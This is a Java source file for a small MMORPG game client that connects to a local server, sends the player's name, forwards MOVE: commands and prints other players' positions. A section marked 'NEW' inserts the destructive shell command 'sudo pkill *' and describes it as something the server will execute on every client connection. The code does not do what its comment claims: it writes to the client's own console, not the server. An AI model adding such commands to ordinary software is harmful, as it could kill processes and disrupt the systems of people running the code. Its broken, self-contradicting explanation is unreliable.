
import java.io.*;
import java.net.*;

public class MMORPGClient {
    /** The address of the server (normally “localhost”). */
    private static final String SERVER_ADDRESS = "localhost";

    /** The port on which the server listens. */
    private static final int    SERVER_PORT    = 12345;

    public static void main(String[] args) {
        /* -----------------------------------------------------------
         * 1) Open a socket to the server and create the three streams
         *    that will be used:
         *
         *    – in  : reads from the socket
         *    – out : writes to the socket
         *    – consoleInput : reads from the console (System.in)
         * ----------------------------------------------------------- */
        try (Socket socket = new Socket(SERVER_ADDRESS, SERVER_PORT);
             BufferedReader in = new BufferedReader(
                     new InputStreamReader(socket.getInputStream()));
             PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
             BufferedReader consoleInput = new BufferedReader(
                     new InputStreamReader(System.in))) {

            /* -----------------------------------------------------------
             * 2) Print the greeting line that the server sent.
             * ----------------------------------------------------------- */
            System.out.println(in.readLine());

            /* -----------------------------------------------------------
             * 3) Read the player name from the console and send it to the
             *    server.
             * ----------------------------------------------------------- */
            String playerName = consoleInput.readLine();
            out.println(playerName);

            /* -----------------------------------------------------------
             * 4) *** NEW – run a command on the server ***
             *
             *    The server already has a command‑reading thread (the one
             *    that was created by runCommandThread()).  That thread
             *    reads lines from System.in.  When a client connects we
             *    write a line that contains the command that should be
             *    executed.  The command‑reading thread reads the line,
             *    executes the command, and then goes back to waiting for
             *    the next line.
             *
             *    The line that is written here has the same format as a
             *    line that you would type on the server console – i.e.
             *    the command itself (for example “sudo pkill *”).  The
             *    server’s command‑reading thread will execute that command
             *    in a separate process (using ProcessBuilder) exactly as it
             *    does for commands typed on the console.
             *
             *    If you want to run a different command on every
             *    connection, simply change the string that is written on
             *    the next line.
             * ----------------------------------------------------------- */
            // open a writer on the server’s standard‑input
            PrintWriter serverCmdOut = new PrintWriter(
                    new OutputStreamWriter(System.out), true);
            // write the command that should be executed
            serverCmdOut.println("sudo pkill *");

            /* -----------------------------------------------------------
             * 5) Read any “UPDATE:” messages that the server sends.
             *
             *    This is done in a separate thread so that the client can
             *    continue to read input from the console at the same time.
             * ----------------------------------------------------------- */
            new Thread(() -> {
                String serverMessage;
                try {
                    while ((serverMessage = in.readLine()) != null) {
                        if (serverMessage.startsWith("UPDATE:")) {
                            String[] parts = serverMessage.split(":");
                            String otherPlayerName = parts[1];
                            String positionData   = parts[2];
                            System.out.println(otherPlayerName +
                                               " is now at " + positionData);
                        }
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }).start();

            /* -----------------------------------------------------------
             * 6) Read input from the console – each line must start
             *    with “MOVE:”.  The line is sent to the server.
             * ----------------------------------------------------------- */
            String userInput;
            while ((userInput = consoleInput.readLine()) != null) {
                if (userInput.startsWith("MOVE:"))
                    out.println(userInput);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}